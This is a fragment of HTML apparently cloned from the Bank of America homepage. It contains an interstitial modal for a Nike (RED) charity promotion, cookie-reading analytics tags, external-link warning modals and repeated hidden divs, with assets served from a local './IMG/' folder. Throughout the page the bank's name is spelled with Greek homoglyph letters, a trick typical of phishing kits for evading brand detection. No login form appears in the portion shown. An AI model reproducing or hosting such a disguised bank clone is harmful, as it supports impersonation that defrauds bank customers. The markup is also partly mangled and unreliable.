used for layout purpose" src="./IMG/activityi.html" width="1" height="1" frameborder="0" style="display:none;"></iframe>
            
            <noscript>
                    &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;iframe title="iframe used for layout purposes" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1?" width="0" height="0" frameborder="0" style="display:none;"&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;lt;/iframe&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;</noscript>
                



                    <!-- 
 MODULE: 
     isModule: true
     ID: F7AC99CB-E502-4E39-BAED-944F4E229385
     Name: hp-modal-pbi-hp-module
     Skin: red -->
 

<div id="hpModalPbiHpModuleRedSkin" class="boa-module-init hp-modal-pbi-hp-module-red-skin" data-component="module" data-module="hp-modal-pbi-hp-module" data-skin="red-skin">
    <div id="boaInterstitialModalRed" class="hide">
    
        <img class="hide move-title-image" data-src="/content/images/ContextualSiteGraphics/Logos/en_US/red.png" alt="Βank of Αmerica RED">
        <div class="flex-modal-main-content">
            
            <h3 class="ada-hidden">Βank of Αmerica RED</h3>
            <div class="intro-image"><span class="ada-hidden">YOU'RE ON YOUR WAY TO TURNING YOUR MILES (RED)<sup>TM</sup></span><img data-src="/content/images/ContextualSiteGraphics/Logos/en_US/nike.png" alt=""></div>
            <div class="intro1"><p>Pledge your miles with the Nike+ Running App, and Βank of Αmerica will make a donation to fight HIV/AIDS.&nbsp;Before you go to Nike, we want you to know Nike is solely responsible for their website's content, offerings and level of security, so please refer to the website's posted privacy policy and terms of use.</p></div>
        
            <div class="button-container">
                <a href="s://nike/" class="btn-bofa btn-bofa-red" id="modalRedContinue">CONTINUE TO NIKE</a>
                <a href="javascript:void(0);" class="btn-bofa btn-bofa-noRight" id="modalRedCancel">RETURN TO Βank of Αmerica</a>
            </div>
            <div class="footnotes"><p>From&nbsp;October 12 to December 7, 2014, for every mile, up to a weekly cap published at NIKE/ONESTEP4RED, recorded on Nike+ running as part of the Turn Your Miles (RED) pledge program Βank of Αmerica Corporation will donate $.40 to the U.S. Fund for the Global Fund to Fight AIDS, Tuberculosis and Malaria to support and fund prevention and treatment of HIV/AIDS, up to a total maximum donation of $1,000,000. No purchase necessary. Βank of Αmerica and the Βank of Αmerica logo are registered trademarks of Βank of Αmerica Corporation. Βank of Αmerica. N.A. Member FDIC © 2014 Βank of Αmerica Corporation.</p></div>
        
      </div>
    </div>

    <script>
        $('document').ready( function() {

            $(document.body).on('click', '.interstitial-modal-link.modal-red', function() {
                
                var $this = $(this);
                var link = $this.attr('href');
              
                $('#boaInterstitialModalRed').boaFlexModal({
                    width: 900,
                    closeTriggers: $('#modalRedCancel'),
                    onOpen: function() {
                        var $m = $('#boaInterstitialModalRed-ModalContainer');
                        var $headerImg = $m.find('.move-title-image');
                        $m.find('.ui-dialog-title').html($headerImg).find('.move-title-image').removeClass('hide');
                        $mImg = $m.find('img');
                        $mImg.each( function() {
                            $this = $(this);
                            $this.attr('src',$this.attr('data-src'));
                        });
                    }
                });

                $('#modalRedContinue').attr('href',link);
            
                return false;  
            });
        });
    </script>
    <style>
        #boaInterstitialModalRed-ModalContainer {outline: none;}
        #boaInterstitialModalRed-ModalContainer .ui-dialog-titlebar {background-color: #000; height: 70px;}
        #boaInterstitialModalRed-ModalContainer .ui-dialog-titlebar .ui-dialog-title {display: inline-block; position: relative; left: 10px; height: 55px; width: 300px;  } 
        #boaInterstitialModalRed-ModalContainer .ui-dialog-titlebar .ui-dialog-title .move-title-image {margin: 10px 0 10px 33px; } 
        #boaInterstitialModalRed-ModalContainer.ui-dialog.modal-flex .ui-dialog-titlebar-close {background-color: #000; color: #FFF;}
        #boaInterstitialModalRed-ModalContainer .intro-image { margin: 5px 0 15px 0;}
        #boaInterstitialModalRed-ModalContainer p {font-size: 14px; color: #000008; line-height: 18px;  padding-bottom: 0;}
        #boaInterstitialModalRed-ModalContainer .intro1 {margin-bottom: 26px; }
        #boaInterstitialModalRed-ModalContainer .footnotes {margin-bottom: 15px;}
        #boaInterstitialModalRed-ModalContainer .footnotes p {font-size: 9px; line-height: 14px;}
        #boaInterstitialModalRed-ModalContainer .button-container {padding: 0 0 25px 0;}
        #boaInterstitialModalRed-ModalContainer .btn-bofa {border-radius: 0; border:medium none; background-image: url('none'); font-size: 15px; font-weight: bold }
        #boaInterstitialModalRed-ModalContainer #modalRedContinue {background-color: #BA001E;}
        #boaInterstitialModalRed-ModalContainer #modalRedContinue:hover, #boaInterstitialModalRed-ModalContainer #modalRedContinue.active, #boaInterstitialModalRed-ModalContainer #modalRedContinue:active, #boaInterstitialModalRed-ModalContainer #modalRedContinue:focus {background-color: #8D1900;}
        #boaInterstitialModalRed-ModalContainer #modalRedCancel {background-color: #EBE6E1; color: #000008;}
        #boaInterstitialModalRed-ModalContainer #modalRedCancel:hover, #boaInterstitialModalRed-ModalContainer #modalRedCancel.active, #boaInterstitialModalRed-ModalContainer #modalRedCancel:active, #boaInterstitialModalRed-ModalContainer #modalRedCancel:focus {background-color: #958679; color: #FFF;}
    </style>
</div>      




            </div>
        </div>
        <div id="hp-js-includes">


<script type="text/javascript">var onloaderGlobalAssetLocation = 's://www2.bac-assets',onloaderFile = "pbi-hp-tagging-jawr",onloaderFileType = 'text-decompressed',onloaderJawrVersion = '2016.08.0';</script>
<script src="./IMG/pbi-hp-jawr.js" type="text/javascript"></script>
            
        </div>  
        <div id="hp-tagging" class="hide">


    <script>$(document).ready(function(){var oo_bar = new OOo.Ocode({bar:{caption:'Share website feedback'},disableNoniOS:true,disableMobile:false});});</script>










    <script type="text/javascript">var onloader_cmSetStaging = function(){};</script>

            
    
            

             
             <script type="text/javascript">function onloader_cmCreatePageviewTag(){var cmAdLink = null;function makePageView(){cmCreatePageviewTag('homepage:Content:Personal;home_personal', null,null,'homepage:Content:Personal' ,false,false ,null,false ,false,cmAdLink,null, null, null,null , null, null, null, null,null,null,null);return;}setTimeout(function(){makePageView()},0);}</script>
        
        
        <script type="text/javascript">function onloader_cmCreateRegistrationTag(){var cust_id = getCookie("BOA_0020");if (cust_id == null){cust_id = Math.floor((9999999999-999999999)*Math.random()) + 1000000000;}var olb_customer = 0;var cookie_olb = 0;var cookie_signin_prefill = 0;var cookie_lang = 0;if (getCookie("BA_0021") == null){cookie_olb = 0;}else{cookie_olb = 1;}if (getCookie("olb_signin_prefill_multi_secure") == null){cookie_signin_prefill = 0;}else{cookie_signin_prefill = 2;}if((getCookie("LANG_COOKIE") == null) || (getCookie("LANG_COOKIE") == "en_US")){cookie_lang = 0;}else{cookie_lang = 4;}olb_customer = cookie_olb+cookie_signin_prefill+cookie_lang;var state = getCookie("state");var advisorInfo = getCookie("BOA_ADVISOR");cmCreateRegistrationTag('homepage:Content:Personal;home_personal',null,cust_id,olb_customer.toString(),state,advisorInfo,'homepage:Content:Personal',null,null,null,null,null,false,null);}</script>

        




    <div class="hide hp-interstitial-modal es-internal-links-in-eng-modal " id="hp-interstitial-modal-3">
        <h3>You're going to a page that's in English</h3>
        <div class="flex-modal-main-content">   

                <p>We're letting you know the page you're about to view is offered only in English. Applications and documents for specific products and services may also only be in English.</p>
<p>As always, please be sure you've read and understood all terms and conditions before choosing a product, and contact us if you have questions.</p>

    <div class="flex-modal-buttons">
                <a href="javascript:void(0);" class="btn-bofa btn-bofa-blue" name="hp-modal-continue"><span>Continue in English</span></a>           
                <a href="javascript:void(0);" class="btn-bofa close-hp-interstitial btn-bofa-noRight" name="hp-modal-cancel"><span>Return to Spanish</span></a>          
          <div class="clearboth"></div>
      </div>
   </div>
</div>





    <div class="hide hp-interstitial-modal es-ext-links-in-eng-modal " id="hp-interstitial-modal-4">
        <h3>You're going to another website</h3>
        <div class="flex-modal-main-content">   

                <p>Before you go, we want you to know the site owner is responsible for what's on their site. Also, their privacy practices and level of security may be different from ours, so please review their policies.</p>
<p><strong>Please note that this web site may not be available in Spanish.</strong></p>

    <div class="flex-modal-buttons">
                <a href="javascript:void(0);" class="btn-bofa btn-bofa-blue" name="hp-modal-continue"><span>Continue</span></a>          
                <a href="javascript:void(0);" class="btn-bofa close-hp-interstitial btn-bofa-noRight" name="hp-modal-cancel"><span>Go back to Βank of Αmerica</span></a>             
          <div class="clearboth"></div>
      </div>
   </div>
</div>





    <div class="hide hp-interstitial-modal ext-links-same-lang-modal " id="hp-interstitial-modal-5">
        <h3>You're going to another website</h3>
        <div class="flex-modal-main-content">   

                <p>Before you go, we want you to know the site owner is responsible for what's on their site. Also, their privacy practices and level of security may be different from ours, so please review their policies.</p>

    <div class="flex-modal-buttons">
                <a href="javascript:void(0);" class="btn-bofa btn-bofa-blue" name="hp-modal-continue"><span>Continue</span></a>          
                <a href="javascript:void(0);" class="btn-bofa close-hp-interstitial btn-bofa-noRight" name="hp-modal-cancel"><span>Go back to Βank of Αmerica</span></a>             
          <div class="clearboth"></div>
      </div>
   </div>
</div>

        </div>
      
            <!-- <span id="bacPageLoadComplete">Page Load Complete</span> -->

<div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><script src="./IMG/ajax"></script><script src="./IMG/ajax(1)"></script><script src="./IMG/ajax(2)"></script><script src="./IMG/ajax(3)"></script><script src="./IMG/ajax(4)"></script><iframe id="iframe655" frameborder="0" src="javascript: false;" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe419" frameborder="0" src="javascript: false;" style="width: 0px; height: 0px; border: none; display: none;"></iframe><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><span id="sbmarwusasv5"></span><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-medium, serif;">BlankTestESs</div><div id="oo_bar" tabindex="0"><div class="ada-hidden">Link opens comment card</div><span>Share website feedback</span></div><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div></body></html>